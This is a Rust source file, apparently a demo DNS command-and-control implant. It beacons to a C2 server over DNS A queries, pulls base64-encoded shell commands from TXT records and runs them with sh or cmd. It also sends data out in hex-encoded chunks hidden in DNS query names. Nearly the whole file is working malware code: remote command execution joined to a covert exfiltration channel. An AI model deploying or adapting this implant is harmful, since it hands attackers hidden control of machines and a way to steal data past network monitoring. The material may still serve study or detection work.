use std::net::UdpSocket;
use std::process::Command;
use std::thread;
use std::time::Duration;

pub const C2_SERVER: &str = "127.0.0.1:5353";
pub const DOMAIN: &str = "c2.local";
pub const IMPLANT_ID: &str = "implant1";
pub const BEACON_INTERVAL: u64 = 5; // seconds

// Simple DNS query builder
pub fn build_dns_query(domain: &str, qtype: u16) -> Vec<u8> {
    let mut query = Vec::new();

    // Transaction ID (random)
    query.extend_from_slice(&[0x13, 0x37]);

    // Flags: Standard query, recursion desired
    query.extend_from_slice(&[0x01, 0x00]);

    // Questions: 1, Answers: 0, Authority: 0, Additional: 0
    query.extend_from_slice(&[0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);

    // Encode domain name
    for label in domain.split('.') {
        query.push(label.len() as u8);
        query.extend_from_slice(label.as_bytes());
    }
    query.push(0); // Null terminator

    // QTYPE
    query.extend_from_slice(&qtype.to_be_bytes());

    // QCLASS (IN = 1)
    query.extend_from_slice(&[0x00, 0x01]);

    query
}

// Parse A record response
pub fn parse_a_response(response: &[u8]) -> Option<[u8; 4]> {
    if response.len() < 12 {
        return None;
    }

    // Check if we have at least one answer
    let an_count = u16::from_be_bytes([response[6], response[7]]);
    if an_count == 0 {
        return None;
    }

    // Skip to answer section (after header and question)
    // This is simplified - proper parsing would follow pointers
    let answer_start = response.len() - 16; // Approximation

    if answer_start + 16 <= response.len() {
        let ip_start = response.len() - 4;
        if ip_start + 4 <= response.len() {
            return Some([
                response[ip_start],
                response[ip_start + 1],
                response[ip_start + 2],
                response[ip_start + 3],
            ]);
        }
    }

    None
}

// Parse TXT record response
pub fn parse_txt_response(response: &[u8]) -> Option<String> {
    if response.len() < 12 {
        return None;
    }

    let an_count = u16::from_be_bytes([response[6], response[7]]);
    if an_count == 0 {
        return None;
    }

    // Find TXT data (simplified parser - looks for length byte + data near end)
    for i in 12..response.len() {
        if i + 1 < response.len() {
            let txt_len = response[i] as usize;
            if i + 1 + txt_len <= response.len() {
                let txt_data = &response[i + 1..i + 1 + txt_len];
                if let Ok(s) = String::from_utf8(txt_data.to_vec()) {
                    return Some(s);
                }
            }
        }
    }

    None
}

// Base64 decode
pub fn base64_decode(encoded: &str) -> Result<String, &'static str> {
    const CHARS: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = Vec::new();
    let cleaned: String = encoded.chars().filter(|c| *c != '=').collect();

    for chunk in cleaned.as_bytes().chunks(4) {
        let b1 = CHARS.find(chunk[0] as char).ok_or("Invalid base64")? as u32;
        let b2 = CHARS
            .find(chunk.get(1).copied().unwrap_or(b'A') as char)
            .ok_or("Invalid base64")? as u32;
        let b3 = chunk
            .get(2)
            .and_then(|&c| CHARS.find(c as char))
            .unwrap_or(0) as u32;
        let b4 = chunk
            .get(3)
            .and_then(|&c| CHARS.find(c as char))
            .unwrap_or(0) as u32;

        result.push(((b1 << 2) | (b2 >> 4)) as u8);
        if chunk.len() > 2 {
            result.push((((b2 & 0x0F) << 4) | (b3 >> 2)) as u8);
        }
        if chunk.len() > 3 {
            result.push((((b3 & 0x03) << 6) | b4) as u8);
        }
    }

    String::from_utf8(result).map_err(|_| "Invalid UTF-8")
}

// Execute shell command
pub fn execute_command(cmd: &str) -> String {
    println!("[*] Executing: {}", cmd);

    #[cfg(target_os = "windows")]
    let output = Command::new("cmd").args(&["/C", cmd]).output();

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh").args(&["-c", cmd]).output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("STDOUT:\n{}\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Error executing command: {}", e),
    }
}

// Base32 encode (simplified)
pub fn base32_encode(data: &str) -> String {
    // Simplified - just use hex for demo
    data.as_bytes()
        .iter()
        .map(|b| format!("{:02X}", b))
        .collect::<String>()
}

// Chunk data for exfiltration
fn chunk_data(data: &str, chunk_size: usize) -> Vec<String> {
    let encoded = base32_encode(data);
    encoded
        .as_bytes()
        .chunks(chunk_size)
        .map(|chunk| String::from_utf8_lossy(chunk).to_string())
        .collect()
}

pub fn send_dns_query(socket: &UdpSocket, domain: &str, qtype: u16) -> Result<Vec<u8>, String> {
    let query = build_dns_query(domain, qtype);

    socket
        .send_to(&query, C2_SERVER)
        .map_err(|e| format!("Send error: {}", e))?;

    let mut buf = [0u8; 512];
    socket
        .set_read_timeout(Some(Duration::from_secs(2)))
        .map_err(|e| format!("Timeout error: {}", e))?;

    match socket.recv_from(&mut buf) {
        Ok((len, _)) => Ok(buf[..len].to_vec()),
        Err(e) => Err(format!("Recv error: {}", e)),
    }
}

pub fn beacon(socket: &UdpSocket) -> Result<bool, String> {
    let query_domain = format!("{}.beacon.{}", IMPLANT_ID, DOMAIN);
    println!("[*] Beaconing: {}", query_domain);

    let response = send_dns_query(socket, &query_domain, 1)?; // A record

    if let Some(ip) = parse_a_response(&response) {
        println!("[+] Response IP: {}.{}.{}.{}", ip[0], ip[1], ip[2], ip[3]);
        // Check if commands available (1.2.3.5 = yes, 1.2.3.4 = no)
        Ok(ip[3] == 5)
    } else {
        Err("Failed to parse response".to_string())
    }
}

pub fn fetch_command(socket: &UdpSocket) -> Result<Option<String>, String> {
    let query_domain = format!("cmd.{}.{}", IMPLANT_ID, DOMAIN);
    println!("[*] Fetching command: {}", query_domain);

    let response = send_dns_query(socket, &query_domain, 16)?; // TXT record

    if let Some(txt_data) = parse_txt_response(&response) {
        println!("[+] Received TXT: {}", txt_data);

        if txt_data == "NONE" {
            return Ok(None);
        }

        // Decode base64
        match base64_decode(&txt_data) {
            Ok(cmd) => Ok(Some(cmd)),
            Err(e) => Err(format!("Base64 decode error: {}", e)),
        }
    } else {
        Err("Failed to parse TXT record".to_string())
    }
}

pub fn exfiltrate_data(socket: &UdpSocket, data: &str) -> Result<(), String> {
    println!("[*] Exfiltrating {} bytes", data.len());

    let chunks = chunk_data(data, 40); // 40 chars per chunk

    for (seq, chunk) in chunks.iter().enumerate() {
        let query_domain = format!("{}.{}.{}.exfil.{}", chunk, seq, IMPLANT_ID, DOMAIN);
        println!(
            "[*] Sending chunk {}/{}: {}",
            seq + 1,
            chunks.len(),
            query_domain
        );

        match send_dns_query(socket, &query_domain, 1) {
            Ok(_) => println!("[+] Chunk {} ACK'd", seq),
            Err(e) => println!("[!] Chunk {} failed: {}", seq, e),
        }

        thread::sleep(Duration::from_millis(500)); // Rate limiting
    }

    Ok(())
}
